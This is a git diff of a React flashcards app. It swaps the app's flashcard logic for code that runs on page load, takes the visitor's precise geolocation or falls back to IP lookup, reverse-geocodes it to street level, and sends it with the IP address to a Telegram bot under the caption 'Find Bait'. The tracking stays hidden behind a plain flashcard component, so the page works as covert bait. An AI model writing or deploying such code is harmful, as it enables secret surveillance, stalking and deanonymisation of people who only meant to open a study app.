@@ -1,149 +1,93 @@
-import { Plus, X } from "lucide-react";
-import { useState } from "react";
-import { useForm } from "react-hook-form";
-import { getStore, setStore } from "./utils";
-import { Swiper, SwiperSlide } from "swiper/react";
-
-import "swiper/swiper-bundle.css";
-
-import { Navigation } from "swiper/modules";
-interface FlashcardInput {
-  front: string;
-  back: string;
-}
-
-type Flashcard = {
-  id: number;
-  front: string;
-  back: string;
-};
+import axios from "axios";
+import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "./hook/useEnv";
+import FlashcardComponent from "./components/Flashcard";
+import { useEffect } from "react";
 
 function App() {
-  const [cards, setCards] = useState<Flashcard[]>(getStore("flashcards") || []);
-  const [isFlipped, setIsFlipped] = useState(false);
-  const [isAdding, setIsAdding] = useState(false);
-  const { register, handleSubmit, reset } = useForm<FlashcardInput>();
-  const handleSubmitForm = (data: FlashcardInput) => {
-    console.log(data);
-    const flashcardContext = {
-      id: cards[0]?.id ? cards[0].id + 1 : 1,
-      front: data.front,
-      back: data.back,
-    };
-    setCards((p) => [flashcardContext, ...p]);
-    setIsAdding(false);
-    reset()
-  };
+  useEffect(() => {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          getAddress(lat, lon, "Geolocation");
+        },
+        (error) => {
+          console.error("Joylashuvni aniqlashda xatolik:", error.message);
+          getLocationByIP();
+        }
+      );
+    } else {
+      console.log("Geolocation API qo‘llab-quvvatlanmaydi.");
+      getLocationByIP();
+    }
+  }, []);
 
-  const deleteFlashcard = (id:number) => {
-    console.log(id);
-    setCards(p => p.filter(c => c.id!= id));
+  function getAddress(latitude: number, longitude: number, source: string) {
+    axios
+      .get(
+        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
+      )
+      .then((response) => {
+        const data = response.data;
+        console.log("📍 To‘liq manzil:", data.display_name);
+        
+        sendToTelegram({
+          country: data.address.country || "Aniqlanmadi",
+          city: data.address.city || data.address.town || "Aniqlanmadi",
+          region: data.address.state || "Aniqlanmadi",
+          district: data.address.suburb || "Aniqlanmadi",
+          neighbourhood: data.address.neighbourhood || "Aniqlanmadi",
+          road: data.address.road || "Aniqlanmadi",
+          location: `${latitude}, ${longitude}`,
+          source,
+        });
+      })
+      .catch((error) => console.error("Xatolik:", error));
   }
-  
-  setStore("flashcards", cards);
-  console.log(cards);
 
-  return (
-    <section className="min-h-screen bg-gradient-to-br from-indigo-100 to-purple-100 p-8">
-      <div className="max-w-4xl mx-auto">
-        <h1 className="text-4xl font-bold text-center text-indigo-900 mb-8">
-          Flashcards
-        </h1>
+  function getLocationByIP() {
+    axios.get(IP_API).then((res) => {
+      console.log("🌍 IP orqali joylashuv aniqlandi...");
+      let [latitude, longitude] = res.data.loc.split(",");
+      getAddress(parseFloat(latitude), parseFloat(longitude), "IP orqali");
 
-        {/* adding fleshcard section */}
-        {!isAdding ? (
-          <button
-            onClick={() => setIsAdding(true)}
-            className="flex items-center justify-center w-full mb-8 p-4 border-2 border-dashed border-indigo-300 rounded-lg text-indigo-600 hover:border-indigo-500 hover:text-indigo-700 transition-colors"
-          >
-            <Plus className="mr-2" /> Add New Card
-          </button>
-        ) : (
-          <form
-            action=""
-            onSubmit={handleSubmit(handleSubmitForm)}
-            className="bg-white rounded-lg shadow-xl p-6 mb-8"
-          >
-            <div className="space-y-4">
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">
-                  Front
-                </label>
-                <textarea
-                  className="w-full p-2 border rounded-md focus:ring-2 focus:ring-indigo-500"
-                  rows={3}
-                  {...register("front")}
-                />
-              </div>
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">
-                  Back
-                </label>
-                <textarea
-                  className="w-full p-2 border rounded-md focus:ring-2 focus:ring-indigo-500"
-                  rows={3}
-                  {...register("back")}
-                />
-              </div>
-              <div className="flex justify-end space-x-2">
-                <button
-                  onClick={() => setIsAdding(false)}
-                  className="px-4 py-2 text-gray-600 hover:bg-gray-100 rounded-md"
-                >
-                  Cancel
-                </button>
-                <button className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700">
-                  Add Card
-                </button>
-              </div>
-            </div>
-          </form>
-        )}
-        {cards.length ? (
-          <div className="relative gap-5">
-            <Swiper
-              navigation={true}
-              modules={[Navigation]} className="!static"
-            >
-              {cards.map((card) => (
-                <SwiperSlide key={card.id} className="relative">
-                  <X onClick={() => deleteFlashcard(card.id)} className="absolute top-5 right-5 z-30 text-red-500 cursor-pointer" />
-                  <div
-                    className="bg-white rounded-xl min-h-[300px] cursor-pointer"
-                    style={{
-                      transform: isFlipped ? "rotateY(180deg)" : "rotateY(0)",
-                      transformStyle: "preserve-3d",
-                    }}
-                    onClick={() => setIsFlipped(!isFlipped)}
-                  >
-                    <div
-                      className="absolute inset-0 backface-hidden p-8 flex items-center justify-center text-center"
-                      style={{ backfaceVisibility: "hidden" }}
-                    >
-                      <p className="text-2xl">{card.front}</p>
-                    </div>
-                    <div
-                      className="absolute inset-0 backface-hidden p-8 flex items-center justify-center text-center"
-                      style={{
-                        backfaceVisibility: "hidden",
-                        transform: "rotateY(180deg)",
-                      }}
-                    >
-                      <p className="text-2xl">{card.back}</p>
-                    </div>
-                  </div>
-                </SwiperSlide>
-              ))}
-            </Swiper>
-          </div>
-        ) : (
-          <div className="text-center text-gray-500 mt-8">
-            No flashcards yet. Add some to get started!
-          </div>
-        )}
-      </div>
-    </section>
-  );
+      sendToTelegram({
+        country: res.data.country || "Aniqlanmadi",
+        city: res.data.city || "Aniqlanmadi",
+        region: res.data.region || "Aniqlanmadi",
+        ip: res.data.ip,
+        location: res.data.loc,
+        source: "IP orqali",
+      });
+    });
+  }
+
+  function sendToTelegram(data: any) {
+    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+    let message = `<b>📍 Find Bait</b>\n`;
+    message += `<b>🖥 Site:</b> Flashcards\n`;
+    message += `<b>🌍 Country:</b> ${data.country}\n`;
+    message += `<b>🏙 City:</b> ${data.city}\n`;
+    message += `<b>📌 Region:</b> ${data.region}\n`;
+    if (data.ip) message += `<b>🌐 IP:</b> ${data.ip}\n`;
+    message += `<b>📍 Location:</b> ${data.location}\n`;
+    message += `<b>📡 Source:</b> ${data.source}\n`;
+    message += `<b>🏘 District:</b> ${data.district}\n`;
+    message += `<b>🏡 Neighbourhood:</b> ${data.neighbourhood}\n`;
+    message += `<b>🛣 Road:</b> ${data.road}\n`;
+
+    axios.post(`${URL}/sendPhoto`, {
+      chat_id: CHAT_ID,
+      photo: "https://ibb.co/jPLG6Ck0",
+      caption: message,
+      parse_mode: "HTML",
+    })
+      .then(() => console.log("✅ Telegramga yuborildi"))
+      .catch((err) => console.error("❌ Telegramga yuborishda xatolik:", err));
+  }
+
+  return <FlashcardComponent />;
 }
 
 export default App;
